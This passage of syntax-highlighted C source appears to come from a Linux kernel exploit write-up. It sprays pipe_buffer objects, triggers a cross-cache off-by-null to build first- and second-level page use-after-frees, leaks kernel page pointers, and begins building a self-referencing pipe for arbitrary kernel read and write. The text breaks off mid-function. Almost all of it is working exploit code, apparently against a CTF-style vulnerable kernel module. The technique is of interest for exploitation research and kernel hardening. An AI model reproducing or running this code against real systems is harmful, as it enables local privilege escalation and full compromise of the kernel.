<span class=cm>*/</span>

<span class=kt>void</span><span class=w> </span><span class=nf>corrupting_first_level_pipe_for_page_uaf</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=n>buf</span><span class=p>[</span><span class=mh>0x1000</span><span class=p>];</span>

<span class=w>    </span><span class=n>log_info</span><span class=p>(</span><span class=s>&quot;[*] spray pipe_buffer...&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>PIPE_SPRAY_NUM</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span>

<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>pipe</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>i</span><span class=p>])</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>            </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;[x] failed to alloc %d pipe!&quot;</span><span class=p>,</span><span class=w> </span><span class=n>i</span><span class=p>);</span>
<span class=w>            </span><span class=n>err_exit</span><span class=p>(</span><span class=s>&quot;FAILED to create pipe!&quot;</span><span class=p>);</span>
<span class=w>        </span><span class=p>}</span>
<span class=w>    </span><span class=p>}</span>

<span class=w>    </span><span class=cm>/* spray pipe_buffer on order-2 pages, make vul-obj slub around with that.*/</span>

<span class=w>    </span><span class=n>log_info</span><span class=p>(</span><span class=s>&quot;[*] exetend pipe_buffer...&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>extend_pipe_buffer_to_4k</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=n>PIPE_SPRAY_NUM</span><span class=w> </span><span class=o>/</span><span class=w> </span><span class=mi>2</span><span class=p>)</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=n>err_exit</span><span class=p>(</span><span class=s>&quot;FAILED to extend pipe!&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=p>}</span>

<span class=w>    </span><span class=n>log_info</span><span class=p>(</span><span class=s>&quot;[*] spray vulnerable 2k obj...&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=n>free_page</span><span class=p>(</span><span class=n>pgv_8pages_start_idx</span><span class=o>++</span><span class=p>);</span>
<span class=w>    </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>KCACHE_NUM</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=n>kcache_alloc</span><span class=p>(</span><span class=n>i</span><span class=p>,</span><span class=w> </span><span class=mi>8</span><span class=p>,</span><span class=w> </span><span class=s>&quot;arttnba3&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=p>}</span>

<span class=w>    </span><span class=n>log_info</span><span class=p>(</span><span class=s>&quot;[*] exetend pipe_buffer...&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>extend_pipe_buffer_to_4k</span><span class=p>(</span><span class=n>PIPE_SPRAY_NUM</span><span class=w> </span><span class=o>/</span><span class=w> </span><span class=mi>2</span><span class=p>,</span><span class=w> </span><span class=n>PIPE_SPRAY_NUM</span><span class=w> </span><span class=o>/</span><span class=w> </span><span class=mi>2</span><span class=p>)</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=n>err_exit</span><span class=p>(</span><span class=s>&quot;FAILED to extend pipe!&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=p>}</span>

<span class=w>    </span><span class=n>log_info</span><span class=p>(</span><span class=s>&quot;[*] allocating pipe pages...&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>PIPE_SPRAY_NUM</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=n>write</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span><span class=w> </span><span class=s>&quot;arttnba3&quot;</span><span class=p>,</span><span class=w> </span><span class=mi>8</span><span class=p>);</span>
<span class=w>        </span><span class=n>write</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span><span class=w> </span><span class=o>&amp;</span><span class=n>i</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=kt>int</span><span class=p>));</span>
<span class=w>        </span><span class=n>write</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span><span class=w> </span><span class=o>&amp;</span><span class=n>i</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=kt>int</span><span class=p>));</span>
<span class=w>        </span><span class=n>write</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span><span class=w> </span><span class=o>&amp;</span><span class=n>i</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=kt>int</span><span class=p>));</span>
<span class=w>        </span><span class=n>write</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span><span class=w> </span><span class=s>&quot;arttnba3&quot;</span><span class=p>,</span><span class=w> </span><span class=mi>8</span><span class=p>);</span>
<span class=w>        </span><span class=n>write</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span><span class=w> </span><span class=s>&quot;arttnba3&quot;</span><span class=p>,</span><span class=w> </span><span class=mi>8</span><span class=p>);</span><span class=w>  </span><span class=cm>/* prevent pipe_release() */</span>
<span class=w>    </span><span class=p>}</span>

<span class=w>    </span><span class=cm>/* try to trigger cross-cache overflow */</span>
<span class=w>    </span><span class=n>log_info</span><span class=p>(</span><span class=s>&quot;[*] trigerring cross-cache off-by-null...&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>KCACHE_NUM</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=n>kcache_append</span><span class=p>(</span><span class=n>i</span><span class=p>,</span><span class=w> </span><span class=n>KCACHE_SIZE</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=mi>8</span><span class=p>,</span><span class=w> </span><span class=n>buf</span><span class=p>);</span>
<span class=w>    </span><span class=p>}</span>

<span class=w>    </span><span class=cm>/* checking for cross-cache overflow */</span>
<span class=w>    </span><span class=n>log_info</span><span class=p>(</span><span class=s>&quot;[*] checking for corruption...&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>PIPE_SPRAY_NUM</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=kt>char</span><span class=w> </span><span class=n>a3_str</span><span class=p>[</span><span class=mh>0x10</span><span class=p>];</span>
<span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>nr</span><span class=p>;</span>

<span class=w>        </span><span class=n>memset</span><span class=p>(</span><span class=n>a3_str</span><span class=p>,</span><span class=w> </span><span class=sc>&#39;\0&#39;</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>a3_str</span><span class=p>));</span>
<span class=w>        </span><span class=n>read</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>0</span><span class=p>],</span><span class=w> </span><span class=n>a3_str</span><span class=p>,</span><span class=w> </span><span class=mi>8</span><span class=p>);</span>
<span class=w>        </span><span class=n>read</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>0</span><span class=p>],</span><span class=w> </span><span class=o>&amp;</span><span class=n>nr</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=kt>int</span><span class=p>));</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>strcmp</span><span class=p>(</span><span class=n>a3_str</span><span class=p>,</span><span class=w> </span><span class=s>&quot;arttnba3&quot;</span><span class=p>)</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>nr</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=n>i</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>            </span><span class=n>orig_pid</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>nr</span><span class=p>;</span>
<span class=w>            </span><span class=n>victim_pid</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>i</span><span class=p>;</span>
<span class=w>            </span><span class=n>printf</span><span class=p>(</span><span class=n>SUCCESS_MSG</span><span class=p>(</span><span class=s>&quot;[+] Found victim:&quot;</span><span class=p>)</span><span class=w> </span><span class=s>&quot; %d &quot;</span>
<span class=w>                   </span><span class=n>SUCCESS_MSG</span><span class=p>(</span><span class=s>&quot;, orig: &quot;</span><span class=p>)</span><span class=w> </span><span class=s>&quot;%d</span><span class=se>\n\n</span><span class=s>&quot;</span><span class=p>,</span><span class=w> </span>
<span class=w>                   </span><span class=n>victim_pid</span><span class=p>,</span><span class=w> </span><span class=n>orig_pid</span><span class=p>);</span>
<span class=w>            </span><span class=k>break</span><span class=p>;</span>
<span class=w>        </span><span class=p>}</span>
<span class=w>    </span><span class=p>}</span>

<span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>victim_pid</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>-1</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=n>err_exit</span><span class=p>(</span><span class=s>&quot;FAILED to corrupt pipe_buffer!&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=p>}</span>
<span class=p>}</span>

<span class=kt>void</span><span class=w> </span><span class=nf>corrupting_second_level_pipe_for_pipe_uaf</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=kt>size_t</span><span class=w> </span><span class=n>buf</span><span class=p>[</span><span class=mh>0x1000</span><span class=p>];</span>
<span class=w>    </span><span class=kt>size_t</span><span class=w> </span><span class=n>snd_pipe_sz</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mh>0x1000</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=p>(</span><span class=n>SND_PIPE_BUF_SZ</span><span class=o>/</span><span class=k>sizeof</span><span class=p>(</span><span class=k>struct</span><span class=w> </span><span class=nc>pipe_buffer</span><span class=p>));</span>

<span class=w>    </span><span class=n>memset</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=sc>&#39;\0&#39;</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>));</span>

<span class=w>    </span><span class=cm>/* let the page&#39;s ptr at pipe_buffer */</span>
<span class=w>    </span><span class=n>write</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>victim_pid</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span><span class=w> </span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=n>SND_PIPE_BUF_SZ</span><span class=o>*</span><span class=mi>2</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=mi>24</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=mi>3</span><span class=o>*</span><span class=k>sizeof</span><span class=p>(</span><span class=kt>int</span><span class=p>));</span>

<span class=w>    </span><span class=cm>/* free orignal pipe&#39;s page */</span>
<span class=w>    </span><span class=n>log_info</span><span class=p>(</span><span class=s>&quot;[*] free original pipe...&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=n>close</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>orig_pid</span><span class=p>][</span><span class=mi>0</span><span class=p>]);</span>
<span class=w>    </span><span class=n>close</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>orig_pid</span><span class=p>][</span><span class=mi>1</span><span class=p>]);</span>

<span class=w>    </span><span class=cm>/* try to rehit victim page by reallocating pipe_buffer */</span>
<span class=w>    </span><span class=n>log_info</span><span class=p>(</span><span class=s>&quot;[*] fcntl() to set the pipe_buffer on victim page...&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>PIPE_SPRAY_NUM</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>i</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>orig_pid</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>victim_pid</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>            </span><span class=k>continue</span><span class=p>;</span>
<span class=w>        </span><span class=p>}</span>

<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>fcntl</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span><span class=w> </span><span class=n>F_SETPIPE_SZ</span><span class=p>,</span><span class=w> </span><span class=n>snd_pipe_sz</span><span class=p>)</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>            </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;[x] failed to resize %d pipe!</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=w> </span><span class=n>i</span><span class=p>);</span>
<span class=w>            </span><span class=n>err_exit</span><span class=p>(</span><span class=s>&quot;FAILED to re-alloc pipe_buffer!&quot;</span><span class=p>);</span>
<span class=w>        </span><span class=p>}</span>
<span class=w>    </span><span class=p>}</span>

<span class=w>    </span><span class=cm>/* read victim page to check whether we&#39;ve successfully hit it */</span>
<span class=w>    </span><span class=n>read</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>victim_pid</span><span class=p>][</span><span class=mi>0</span><span class=p>],</span><span class=w> </span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=n>SND_PIPE_BUF_SZ</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=mi>8</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=kt>int</span><span class=p>));</span>
<span class=w>    </span><span class=n>read</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>victim_pid</span><span class=p>][</span><span class=mi>0</span><span class=p>],</span><span class=w> </span><span class=o>&amp;</span><span class=n>info_pipe_buf</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>info_pipe_buf</span><span class=p>));</span>

<span class=w>    </span><span class=n>printf</span><span class=p>(</span><span class=n>INFO_MSG</span><span class=p>(</span><span class=s>&quot;[?] info_pipe_buf-&gt;page: &quot;</span><span class=p>)</span><span class=w> </span><span class=s>&quot;%p</span><span class=se>\n</span><span class=s>&quot;</span><span class=w> </span>
<span class=w>           </span><span class=n>INFO_MSG</span><span class=p>(</span><span class=s>&quot;[?] info_pipe_buf-&gt;ops: &quot;</span><span class=p>)</span><span class=w> </span><span class=s>&quot;%p</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=w> </span>
<span class=w>           </span><span class=n>info_pipe_buf</span><span class=p>.</span><span class=n>page</span><span class=p>,</span><span class=w> </span><span class=n>info_pipe_buf</span><span class=p>.</span><span class=n>ops</span><span class=p>);</span>

<span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>((</span><span class=kt>size_t</span><span class=p>)</span><span class=w> </span><span class=n>info_pipe_buf</span><span class=p>.</span><span class=n>page</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>KERNEL_DIRECT_PHYSMEM_MAP_BASE</span>
<span class=w>        </span><span class=o>||</span><span class=w> </span><span class=p>(</span><span class=kt>size_t</span><span class=p>)</span><span class=w> </span><span class=n>info_pipe_buf</span><span class=p>.</span><span class=n>ops</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>KERNEL_BASE</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=n>err_exit</span><span class=p>(</span><span class=s>&quot;FAILED to re-hit victim page!&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=p>}</span>

<span class=w>    </span><span class=n>log_success</span><span class=p>(</span><span class=s>&quot;[+] Successfully to hit the UAF page!&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=n>printf</span><span class=p>(</span><span class=n>SUCCESS_MSG</span><span class=p>(</span><span class=s>&quot;[+] Got page leak: &quot;</span><span class=p>)</span><span class=w> </span><span class=s>&quot;%p</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=w> </span><span class=n>info_pipe_buf</span><span class=p>.</span><span class=n>page</span><span class=p>);</span>
<span class=w>    </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;&quot;</span><span class=p>);</span>

<span class=w>    </span><span class=cm>/* construct a second-level page uaf */</span>
<span class=w>    </span><span class=n>log_info</span><span class=p>(</span><span class=s>&quot;[*] construct a second-level uaf pipe page...&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=n>info_pipe_buf</span><span class=p>.</span><span class=n>page</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=k>struct</span><span class=w> </span><span class=nc>page</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=p>((</span><span class=kt>size_t</span><span class=p>)</span><span class=w> </span><span class=n>info_pipe_buf</span><span class=p>.</span><span class=n>page</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mh>0x40</span><span class=p>);</span>
<span class=w>    </span><span class=n>write</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>victim_pid</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span><span class=w> </span><span class=o>&amp;</span><span class=n>info_pipe_buf</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>info_pipe_buf</span><span class=p>));</span>

<span class=w>    </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>PIPE_SPRAY_NUM</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>nr</span><span class=p>;</span>

<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>i</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>orig_pid</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>victim_pid</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>            </span><span class=k>continue</span><span class=p>;</span>
<span class=w>        </span><span class=p>}</span>

<span class=w>        </span><span class=n>read</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>0</span><span class=p>],</span><span class=w> </span><span class=o>&amp;</span><span class=n>nr</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>nr</span><span class=p>));</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>nr</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>PIPE_SPRAY_NUM</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=n>nr</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>            </span><span class=n>snd_orig_pid</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>nr</span><span class=p>;</span>
<span class=w>            </span><span class=n>snd_vicitm_pid</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>i</span><span class=p>;</span>
<span class=w>            </span><span class=n>printf</span><span class=p>(</span><span class=n>SUCCESS_MSG</span><span class=p>(</span><span class=s>&quot;[+] Found second-level victim: &quot;</span><span class=p>)</span><span class=s>&quot;%d &quot;</span>
<span class=w>                   </span><span class=n>SUCCESS_MSG</span><span class=p>(</span><span class=s>&quot;, orig: &quot;</span><span class=p>)</span><span class=s>&quot;%d</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=w> </span>
<span class=w>                   </span><span class=n>snd_vicitm_pid</span><span class=p>,</span><span class=w> </span><span class=n>snd_orig_pid</span><span class=p>);</span>
<span class=w>            </span><span class=k>break</span><span class=p>;</span>
<span class=w>        </span><span class=p>}</span>
<span class=w>    </span><span class=p>}</span>

<span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>snd_vicitm_pid</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>-1</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=n>err_exit</span><span class=p>(</span><span class=s>&quot;FAILED to corrupt second-level pipe_buffer!&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=p>}</span>
<span class=p>}</span>

<span class=cm>/**</span>
<span class=cm> * VI - SECONDARY exploit stage: build pipe for arbitrary read &amp; write</span>
<span class=cm>*/</span>

<span class=kt>void</span><span class=w> </span><span class=nf>building_self_writing_pipe</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=kt>size_t</span><span class=w> </span><span class=n>buf</span><span class=p>[</span><span class=mh>0x1000</span><span class=p>];</span>
<span class=w>    </span><span class=kt>size_t</span><span class=w> </span><span class=n>trd_pipe_sz</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mh>0x1000</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=p>(</span><span class=n>TRD_PIPE_BUF_SZ</span><span class=o>/</span><span class=k>sizeof</span><span class=p>(</span><span class=k>struct</span><span class=w> </span><span class=nc>pipe_buffer</span><span class=p>));</span>
<span class=w>    </span><span class=k>struct</span><span class=w> </span><span class=nc>pipe_buffer</span><span class=w> </span><span class=n>evil_pipe_buf</span><span class=p>;</span>
<span class=w>    </span><span class=k>struct</span><span class=w> </span><span class=nc>page</span><span class=w> </span><span class=o>*</span><span class=n>page_ptr</span><span class=p>;</span>

<span class=w>    </span><span class=n>memset</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>));</span>

<span class=w>    </span><span class=cm>/* let the page&#39;s ptr at pipe_buffer */</span>
<span class=w>    </span><span class=n>write</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>snd_vicitm_pid</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span><span class=w> </span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=n>TRD_PIPE_BUF_SZ</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=mi>24</span><span class=w> </span><span class=mi>-3</span><span class=o>*</span><span class=k>sizeof</span><span class=p>(</span><span class=kt>int</span><span class=p>));</span>

<span class=w>    </span><span class=cm>/* free orignal pipe&#39;s page */</span>
<span class=w>    </span><span class=n>log_info</span><span class=p>(</span><span class=s>&quot;[*] free second-level original pipe...&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=n>close</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>snd_orig_pid</span><span class=p>][</span><span class=mi>0</span><span class=p>]);</span>
<span class=w>    </span><span class=n>close</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>snd_orig_pid</span><span class=p>][</span><span class=mi>1</span><span class=p>]);</span>

<span class=w>    </span><span class=cm>/* try to rehit victim page by reallocating pipe_buffer */</span>
<span class=w>    </span><span class=n>log_info</span><span class=p>(</span><span class=s>&quot;[*] fcntl() to set the pipe_buffer on second-level victim page...&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>PIPE_SPRAY_NUM</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>i</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>orig_pid</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>victim_pid</span><span class=w> </span>
<span class=w>            </span><span class=o>||</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>snd_orig_pid</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>snd_vicitm_pid</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>            </span><span class=k>continue</span><span class=p>;</span>
<span class=w>        </span><span class=p>}</span>

<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>fcntl</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span><span class=w> </span><span class=n>F_SETPIPE_SZ</span><span class=p>,</span><span class=w> </span><span class=n>trd_pipe_sz</span><span class=p>)</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>            </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;[x] failed to resize %d pipe!</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=w> </span><span class=n>i</span><span class=p>);</span>
<span class=w>            </span><span class=n>err_exit</span><span class=p>(</span><span class=s>&quot;FAILED to re-alloc pipe_buffer!&quot;</span><span class=p>);</span>
<span class=w>        </span><span class=p>}</span>
<span class=w>    </span><span class=p>}</span>

<span class=w>    </span><span class=cm>/* let a pipe-&gt;bufs pointing to itself */</span>
<span class=w>    </span><span class=n>log_info</span><span class=p>(</span><span class=s>&quot;[*] hijacking the 2nd pipe_buffer on page to itself...&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=n>evil_pipe_buf</span><span class=p>.</span><span class=n>page</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>info_pipe_buf</span><span class=p>.</span><span class=n>page</span><span class=p>;</span>
<span class=w>    </span><span class=n>evil_pipe_buf</span><span class=p>.</span><span class=n>offset</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>TRD_PIPE_BUF_SZ</span><span class=p>;</span>
<span class=w>    </span><span class=n>evil_pipe_buf</span><span class=p>.</span><span class=n>len</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>TRD_PIPE_BUF_SZ</span><span class=p>;</span>
